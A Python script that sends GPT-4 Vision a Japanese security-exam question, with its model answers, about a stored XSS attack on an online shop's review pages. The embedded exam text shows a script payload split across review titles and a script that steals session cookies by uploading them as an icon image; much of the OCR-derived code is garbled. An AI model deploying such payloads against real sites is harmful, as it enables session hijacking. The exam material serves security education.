
import os
import base64
from langchain.chat_models import ChatOpenAI
from langchain.schema.messages import HumanMessage

from langchain.memory import ConversationBufferMemory
from langchain.chains import ConversationChain

def main():
    # APIキーの設定
    with open("apikey.txt") as f:
        key = f.read()
        os.environ["OPENAI_API_KEY"] = str(key)
    
    img_path = "input/2023r05a_sc_pm_qs_1_zu2.png"

    # img_prompt = "画像を日本語で詳細に説明してください。"
    img_prompt = """

以下の<問題文></問題文>と<解答例></解答例>を見て、各設問の解説をしてください。
日本語で回答してください。

<問題文>

Webアプリケーションプログラムの開発に関する次の記述を読んで、設問に答えよ。

0社は、洋服のEC事業を手掛ける従業只190名の会社である。
WebアプリQというWebアプリケーションプログラムでECサイトを運営している。
ECサイトのドメイン名は“□□□.co.jp”であり、利用者はWebアプリQにHTTPSでアクセスする。
WebアプリQの開発と運用は、0社開発部が行っている。
今回、Webアプリ0に、ECサイトの会員による商品レビュー機能を追加した。
図1は、Webアプリ0の主な機能である。


<図1 Webアプリ0Qの主な機能>
1. 会員登録機能
　ECサイトの会員登録を行う。

2.ログイン機能
　会員IDとパスワードで会員を認証する。
　ログインした会員には、セッション1Dをcookieとして払い出す。

3.カートへの商品の追加及び削除機能
　(省略)

4.商品の購入機能
　ログイン済み会員だけが利用できる。
　(省略)

5.商品レビュー機能
　商品レビューを投稿したり閲覧したりするページを提供する。
　商品レビューの投稿は、ログイン済み会員だけが利用できる。
　会員がレビューページに入力できる項目のうち、レビュータイトルとレビュー詳細の欄は自由記述が可能であり、それぞれ50文字と300字の入力文字数制限を設けている。

6.会員プロフィール機能
　アイコン画像をアップロードして設定するためのページ(以下、会員プロフィール設定ページという)や、クレジットカード情報を登録するページを提供する。
　どちらのページもログイン済み会員だけが利用できる。
　アイコン画像のアップロードは、次をパラメータとして、“https://□□□.co.jp/user/upload”に対して行う。
　・画像ファイル（注1）
　・“https://□□□.co.jp/user/profile"にアクセスして払い出されたトークン（注2）
　パラメータのトークンが、“https://口ロロ.co.jp/user/profile"にアクセスして払い出されたものと一致したときは、アップロードが成功する。
　アップロードしたアイコン画像は、会員プロフィール設定ページや、レビューページに表示される。
　(省略)

（注1）パラメータ名は、“uploadfile”である。
（注2）パラメータ名は、“token”である。
</図1 Webアプリ0Qの主な機能>


ある日、会員から、無地Tシャツのレビューページ(以下、ページVという)に16件表示されるはずのレビューが2件しか表示されていないという問合せが寄せられた。
開発部のリーダーであるNさんがページVを閲覧してみると、画面遷移上おかしな点はなく、図2が表示された。

<図2 ページV></図2 ページV>

Webアプリ0のレビューページでは、次の項目がレビューの件数分表示されるはずである。
・レビューを投稿した会員のアイコン画像
・レビューを投稿した会員の表示名
・レビューが投稿された日付
・レビュー評価(1～5個の★)
・会員が入力したレビュータイトル
・会員が入力したレビュー詳細

不審に思ったNさんはページVのHTMLを確認した。
図3は、ページVのHTMLである。


<図3 ページVのHTML>

```html
(省略)
<div class="review-number">16件のレビュー</div>
<div class="review">
<div class="icon"><img src="/users/dac6c8f12f867ed5/icon.png"></div>
<div class="displayname">会員A</div>
<div class="date">2023年4月10日</div><div class="star">★★★★★</div>
<div class="review-title">Good<script>xhr=newXMLHttpRequest();/*</div>
<div class="description">a</div>
</div>
<div class="review">
<div class="icon"><imgsrc=""/users/dac6c8f12f867ed5/icon.png"></div>
<div class="displayname">会員A</div>
<div class="date">2023年4月10日</div><div class="star">★★★★★</div>
<div class="review-title">*/url1="https://□□□.co.jp/user/profile";/*</div>
<div class="description">a</div>
</div>
(省略)
<div class="review">
<div class="icon"><img src="/users/dac6c8f12f867ed5/icon.png"></div>
<div class="displayname">会員A</div>
<div class="date">2023年4月10日</div><div class="star">★★★★★</div>
<div class="review-title">*/xhr2、send(form);}</script></div>
<div class="description">Niceshirt!</div>
</div>
<div class="review">
<div class="icon"><imgsrc="/users/9477446887473b91/icon.png"></div>
<div class="displayname">会員B</div>
<div class="date">2023年4月1日</div><div class="star">★★★★★</div>
<div class="review-title">形も素材も良い</div>
<divclass="description">サイズ感ががったりフィットして気に入っています(&gt;_&lt;)<br>
手触りも良く、値段を考えると良い商品です。</div>
</div>
<divclass="review-end">以上、全16件のレビュー</div>(省略)
```
</図3 ページVのHTML>

3ページVのHTML3のHTMLを確認したNさんは、会員Aによって15件のレビューが投稿されていること、及びページVには長いスクリプトが埋め込まれていることに気付いた。
Nさんは、ページVにアクセスしたときに生じる影響を調査するために、アクセスしたときにWebブラウザで実行されるスクリプトを抽出した。
図4は、Nさんが抽出したスクリプトである。

<図4 Nさんが抽出したスクリプト>

``` javascript

1: xhr = new XMLHttpRequest();
2: url1 = "https://OOD.co.jp/user/profile";
3: xhr.open("get"、urll);
4: xhr.responseType="document"; //レスポンスをテキストではなくDOMとして受信する。
5: xhr.send();
6: xhr.onload=function(){ //以降は、1回目のXMLHttpRequest(XHR)のレスポンスの受信に成功してから実行される。
7: page=xhr.response;
8: token=page.getElementByld("token").value;
9: xhr2=newXMLHttpRequest();
10: url2="https://OOD.co.jp/user/upload";
11: xhr2.open("post"、url2);
12: form=newFormData();
13: cookie=document.cookie;
14: fname="a.png";
15: ftype="image/png";
16: file=newFile([cookie]、fname、{type:ftype});
      //アップロードするファイルオブジェクト
      //第1引数:ファイルコンテンツ
      //第2引数:ファイル名
      //第3引数:MTMEタイプなどのオプション
17: form.append("uploadfile", file);
18: form、append("token", token);
19: xhr2.send(form);
20: }

```

（注記）スクリプトの整形とコメントの追記は、Nさんが実施したものである。

</図4 Nさんが抽出したスクリプト>


会員Aの投稿はクロスサイトスクリプティング(XSS)脆弱性を悪用した攻撃を成立させるためのものであるという疑いをもった。
NさんがWebアプリQを調べたところ、WebアプリQには、会員が入力したスクリプトが実行されてしまう脆弱性があることを確認した。
加えて、WebアプリQがcookieにHttpOnly属性を付与していないこと及びアップロードされた画像ファイルの形式をチェックしていないことも確認した。
Q社は、必要な対策を施し、会員への必要な対応も行った。



<設問>

<設問1>
この攻撃で使われたXSS脆弱性について答えよ。
(1)XSS脆弱性の種類を解答群の中から選び、記号で答えよ。
解答群
ア:DOM Based XSS
イ:格納型 XSS
ウ:反射型 XSS

(2)Webアプリ0における対策を、30字以内で答えよ。
</設問1>

<設問2>
図3について、入力文字数制限を超える長さのスクリプトが実行されるようにした方法を、50字以内で答えよ。
</設問2>

<設問3>
図4のスクリプトについて答えよ。
(1)図4の6～20行目の処理の内容を、60字以内で答えよ。
(2)攻撃者は、図4のスクリプトによってアップロードされた情報をどのようにして取得できるか。
取得する方法を、50字以内で答えよ。
(3)攻撃者が(2)で取得した情報を使うことによってできることを、40字以内で答えよ。
</設問3>

<設問4>
仮に、攻撃者が用意したドメインのサイトに図4と同じスクリプトを含むHTMLを準備し、そのサイトにWebアプリQのログイン済み会員がアクセスしたとしても、Webブラウザの仕組みによって攻撃は成功しない。
この仕組みを、40字以内で答えよ。
</設問4>

</設問>

</問題文>



<解答例>
<設問1>
(1)：イ
(2)：レビュータイトルを出力する前にエスケープ処理を施す。
</設問1>

<設問2>
HTMLがコメントアウトされ一つのスクリプトになるような投稿を複数回に分けて行った。
</設問2>

<設問3>
(1)：XHRのレスポンスから取得したトークンとともに、アイコン画像としてセッションIDをアップロードする。
(2)：会員のアイコン画像をダウンロードして、そこからセッションIDの文字列を取り出す。
(3)：ページVにアクセスした会員になりすまして、WebアプリQの機能を使う。
</設問3>

<設問4>
スクリプトから別ドメインのURLに対してcookieが送られない仕組み
</設問4>


</解答例>



"""

    chat = ChatOpenAI(model="gpt-4-vision-preview", max_tokens=1024)

    with open(img_path, "rb") as image_file:
        img_base64 = base64.b64encode(image_file.read()).decode('utf-8')


    # msg = chat.invoke([
    #     HumanMessage(content=[
    #         {"type": "text", "text": img_prompt},
    #         {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{img_base64}"}}
    #     ])
    # ])
    
    # print()
    # print("##############################")
    # print(msg.content)
    # print()

    memory = ConversationBufferMemory(return_messages=True)
    chain = ConversationChain(
        llm=chat,
        memory=memory
    )

    msg = chain([
        HumanMessage(content=[
            {"type": "text", "text": img_prompt},
            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{img_base64}"}}
        ])
    ])

    print()
    print("##############################")
    print(msg.content)
    print()


if __name__ == "__main__":
    main()